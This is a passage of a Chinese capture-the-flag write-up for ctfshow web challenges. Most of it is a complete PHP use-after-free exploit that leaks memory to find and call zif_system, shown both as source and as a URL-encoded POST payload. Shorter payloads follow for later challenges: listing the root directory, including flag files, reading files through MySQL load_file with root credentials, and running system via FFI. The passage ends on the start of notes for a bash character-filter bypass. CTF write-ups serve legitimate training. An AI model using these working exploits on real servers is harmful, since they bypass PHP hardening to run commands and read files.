<span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>URL</code>ç¼–ç ä¸€ä¸‹ç›´æ¥æ‰“ï¼ˆæ³»è¯ï¼Œæˆ‘å·²ç»çœ‹æ‡µäº†<code>/(ã„’oã„’)/~~</code>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B</span><br></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web75"><a href="#web75" class="headerlink" title="*web75"></a>*web75</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="*web77"></a>*web77</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>æŸ¥çœ‹æºç å‘ç°<code>&lt;!-- system($code);--&gt;</code>ï¼Œfuzzå°è¯•ä¹‹åå‘ç°åªæœ‰å¤§å†™å­—æ¯å’Œ<code>$&#123;&#125;:?.~</code>ç­‰ç­‰å­—ç¬¦å¯ä»¥é€šè¿‡ï¼Œåˆ©ç”¨<code>bash</code>å†…ç½®å˜é‡è¿›è¡Œç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;PWD&#125; </span><br><span class="line">/root                                                                                     # echo $&#123;PWD:0:1&#125;      #è¡¨ç¤ºä»0ä¸‹æ ‡å¼€å§‹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">/                                                                                         </span><br><span class="line"># echo $&#123;PWD:~0:1&#125;      #ä»ç»“å°¾å¼€å§‹å¾€å‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">t                                                                              </span><br><span class="line"># echo $&#123;PWD:~0&#125;      </span><br><span class="line">t                                                                           </span><br><span class="line"># echo $&#123;PWD:~A&#125;       #æ‰€ä»¥å­—æ¯å’Œ0å…·æœ‰åŒæ ·ä½œç”¨             </span><br><span class="line">t                                                                 </span><br><span class="line"># echo $&#123;PATH&#125;                            </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"># echo 